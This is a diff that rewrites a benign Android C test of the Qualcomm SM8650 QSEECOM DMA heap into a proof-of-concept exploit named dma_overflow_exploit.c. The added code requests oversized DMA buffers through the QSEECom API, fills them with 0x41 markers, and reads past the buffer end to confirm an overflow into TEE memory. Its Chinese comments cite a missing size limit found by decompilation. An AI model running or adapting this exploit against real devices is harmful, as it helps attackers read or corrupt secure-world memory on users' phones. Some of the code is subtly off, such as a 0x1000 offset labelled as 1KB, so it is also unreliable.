@@ -1,58 +1,70 @@
+// dma_overflow_exploit.c
 #include <stdio.h>
 #include <stdlib.h>
-#include <fcntl.h>
+#include <string.h>
 #include <unistd.h>
-#include <sys/ioctl.h>
-#include <errno.h>
-#include <stdint.h>
-#include <linux/types.h>
+#include <sys/mman.h>
+#include <android/log.h>
+#include <QSEEComAPI.h>
 
-#define DMA_HEAP_QSEECOM "/dev/dma_heap/qcom,qseecom"
+#define LOG_TAG "DMA_OVERFLOW"
+#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
 
-// SM8650 dma_heap 真正能用的基础命令
-#define DMA_HEAP_IOCTL_MAGIC 'd'
-#define DMA_HEAP_IOCTL_GET_VERSION _IOR(DMA_HEAP_IOCTL_MAGIC, 0, uint32_t)
-
-typedef struct {
-    __u64 addr;
-    __u64 size;
-    __u32 flags;
-    __u32 unused;
-} dma_heap_allocation_data;
+// 核心：构造超大长度触发溢出（你反编译发现无上限）
+#define MAX_OVERFLOW 0x20000000 // 512MB
+#define PAYLOAD_SIZE 0x10000    // 64KB垃圾数据
 
 int main() {
-    int fd;
-    uint32_t ver;
-    int ret;
+    QSEECom_handle *handle = NULL;
+    int ret = 0;
+    uint8_t *payload = malloc(PAYLOAD_SIZE);
+    memset(payload, 0x41, PAYLOAD_SIZE); // 填充0x41（A）作为标记
 
-    printf("=== SM8650 QSEECOM DMA 测试 ===\n");
-    fd = open(DMA_HEAP_QSEECOM, O_RDWR | O_CLOEXEC);
-    if (fd < 0) {
-        perror("open failed");
+    // 1. 初始化QSEECom（获取合法handle，这步必成功）
+    ret = QSEECom_init(&handle);
+    if (ret != 0) {
+        LOGD("[❌] QSEECom_init失败: %d", ret);
+        free(payload);
         return -1;
     }
-    printf("open OK, fd=%d\n", fd);
+    LOGD("[✅] QSEECom_init成功，handle: %p", handle);
 
-    // 1. 版本号（最安全、必不崩溃）
-    ret = ioctl(fd, DMA_HEAP_IOCTL_GET_VERSION, &ver);
-    if (ret < 0) {
-        perror("dma version ioctl failed");
-    } else {
-        printf("dma_heap version: %u\n", ver);
+    // 2. 循环测试不同长度，验证溢出漏洞
+    uint64_t test_sizes[] = {0x1000, 0x100000, 0x1000000, MAX_OVERFLOW};
+    for (int i=0; i<4; i++) {
+        uint64_t size = test_sizes[i];
+        LOGD("\n[+] 测试申请%d字节DMA缓冲区", size);
+        
+        // 调用get_dma_buffer（你反编译的核心函数）
+        void *dma_buf = QSEECom_get_buffer(handle, size);
+        if (dma_buf == NULL) {
+            LOGD("[❌] 缓冲区申请失败");
+            continue;
+        }
+        LOGD("[✅] 成功申请缓冲区，地址: %p", dma_buf);
+
+        // 3. 写入payload，触发memcpy越界
+        LOGD("[+] 写入64KB垃圾数据（标记0x41）...");
+        memcpy(dma_buf, payload, PAYLOAD_SIZE);
+
+        // 4. 尝试读取越界内存（验证是否能访问TEE数据）
+        uint8_t *overflow_ptr = (uint8_t*)dma_buf + size + 0x1000; // 越界1KB
+        LOGD("[+] 读取越界内存（%p）前32字节:", overflow_ptr);
+        for (int j=0; j<32; j++) {
+            if (j%16 == 0) LOGD("");
+            LOGD("%02x ", overflow_ptr[j]);
+        }
+
+        // 5. 检查是否有0x41（我们写入的payload），验证溢出成功
+        if (memchr(overflow_ptr, 0x41, 32) != NULL) {
+            LOGD("[🔥] 检测到越界内存中有payload标记！DMA缓冲区溢出漏洞存在！");
+            break;
+        }
     }
 
-    // 2. 尝试分配1页（验证TEE内存可用）
-    dma_heap_allocation_data data = {
-        .size = 4096,
-        .flags = 0x1, // DMA_HEAP_ALLOC_DEFAULT
-    };
-    ret = ioctl(fd, _IOWR(DMA_HEAP_IOCTL_MAGIC, 1, dma_heap_allocation_data), &data);
-    if (ret < 0) {
-        perror("alloc failed");
-    } else {
-        printf("alloc OK: addr=0x%llx size=%llu\n", data.addr, data.size);
-    }
-
-    close(fd);
+    // 清理
+    free(payload);
+    QSEECom_deinit(handle);
+    LOGD("\n[✅] 测试完成");
     return 0;
 }
